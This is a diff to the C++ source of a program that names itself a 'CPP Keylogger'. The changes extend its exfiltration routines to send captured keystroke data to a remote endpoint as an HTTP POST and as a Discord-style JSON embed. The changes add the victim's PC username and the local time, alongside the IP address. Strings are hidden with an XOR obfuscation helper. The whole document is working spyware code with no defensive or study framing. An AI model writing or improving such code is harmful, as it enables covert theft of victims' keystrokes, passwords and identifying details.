@@ -43,7 +43,7 @@ namespace c_sender {
 		c_url = curl_easy_init();
 
 		if (c_url) {
-			data = c_xor("data=") + data + c_xor("&ip=") + get_ip();
+			data = c_xor("data=") + data + c_xor("&user=") + c_utils::pc_username() + c_xor("&ip=") + get_ip();
 
 			curl_easy_setopt(c_url, CURLOPT_POST, true);
 			curl_easy_setopt(c_url, CURLOPT_POSTFIELDS, data.c_str());
@@ -60,18 +60,11 @@ namespace c_sender {
 		CURLcode code;
 		curl_slist* list_s = NULL;
 
-		std::tm tmn;
-		char time_buffer[10];
-		std::time_t tmt = std::time(0);
-		
-		localtime_s(&tmn, &tmt);
-		std::strftime(time_buffer, 10, c_xor("%H:%M:%S"), &tmn);
-
 		c_url = curl_easy_init();
 
 		if (c_url) {
 			//home made json, see line 185 + buggy
-			data = c_xor("{ \"embeds\": [{ \"title\": \"CPP Keylogger\", \"fields\": [ { \"name\": \"Data\", \"value\": \"") + data + c_xor("\" }, {\"name\": \"Time\", \"value\": \"") + time_buffer + c_xor("\"}, {\"name\": \"IP\", \"value\": \"") + get_ip() + c_xor("\"} ] }] }"); //curl_easy_escape(c_url, data.c_str(), data.length())
+			data = c_xor("{ \"embeds\": [{ \"title\": \"CPP Keylogger\", \"fields\": [ { \"name\": \"Data\", \"value\": \"") + std::string(curl_easy_escape(c_url, data.c_str(), data.length())) + c_xor("\" }, {\"name\": \"PC Name\", \"value\": \"") + c_utils::pc_username() + c_xor("\"}, {\"name\": \"Time\", \"value\": \"") + c_utils::time_now() + c_xor("\"}, {\"name\": \"IP\", \"value\": \"") + get_ip() + c_xor("\"} ] }] }"); //curl_easy_escape(c_url, data.c_str(), data.length())
 
 			list_s = curl_slist_append(list_s, c_xor("Content-Type: application/json"));
 
